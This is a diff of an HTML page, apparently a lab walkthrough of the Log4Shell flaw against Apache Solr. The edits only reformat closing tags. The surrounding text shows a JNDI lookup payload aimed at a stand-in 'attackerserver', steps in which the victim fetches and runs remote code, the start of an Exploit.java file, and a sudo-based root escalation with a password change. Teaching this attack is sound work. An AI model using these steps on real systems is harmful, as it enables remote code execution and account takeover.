@@ -172,7 +172,8 @@
             <br>
 
             <p>On the dashboard, there are tons of arguments displayed, but the main one that we are interested in is
-                <code>/var/solr/logs</code> because that is where Solr stores its logs.</p>
+                <code>/var/solr/logs</code> because that is where Solr stores its logs.
+            </p>
 
             <figure>
                 <img src="../images/solr_logs_directory.jpg" alt="Solr Logs Directory">
@@ -262,7 +263,8 @@
                 like we wanted to. We need to keep this command running while we perform exploitation, so let's open a
                 new terminal. To make things easier, I used tmux, a terminal multiplexer that allows me to view two
                 screens at once. You can also use other terminal multiplexers such as GNU Screen, Konsole, or many
-                others.</p>
+                others.
+            </p>
 
             <p>Now, we have to run an HTTP GET request to receive data with the following one-line command:</p>
 
@@ -290,7 +292,8 @@
             <p>The <code>-m</code> in this command is used to specify a module—in which we specified
                 <code>http.server</code>. The <code>http.server</code> module is used to start a simple local HTTP
                 server. The server will be serving on port 8000. After running this command, we successfully start our
-                local server as shown below.</p>
+                local server as shown below.
+            </p>
 
             <figure>
                 <img src="../images/http_server_started.jpg" alt="HTTP Server Started">
@@ -307,7 +310,8 @@
                 <li><code>${jndi:ldap://attackerserver:1389/Resource}</code> &rarr; reaches out to our LDAP Referral
                     Server</li>
                 <li>LDAP Referral Server springboards the request to a secondary
-                    <code>http://attackerserver/resource</code></li>
+                    <code>http://attackerserver/resource</code>
+                </li>
                 <li>The victim retrieves and executes the code present in <code>http://attackerserver/resource</code>
                 </li>
             </ol>
@@ -337,7 +341,8 @@
             <p>In this new terminal session, we want to write some code in Java. Let's move to a different directory and
                 create a Java file named <code>Exploit.java</code>. You can use any text editor like Vim, Nano, or any
                 that you prefer. I personally use Vim, so the following command is what I used to create our
-                <code>Exploit.java</code> file:</p>
+                <code>Exploit.java</code> file:
+            </p>
 
             <pre><code>vim Exploit.java</code></pre>
 
@@ -431,7 +436,8 @@ public class Exploit {
             <pre><code>sudo -l</code></pre>
 
             <p>For Secure Shell Protocol (SSH) access, we want to become root and change the password of the
-                <code>solr</code> account that we are currently on with the following two commands:</p>
+                <code>solr</code> account that we are currently on with the following two commands:
+            </p>
 
             <pre><code>sudo bash
 passwd solr</code></pre>
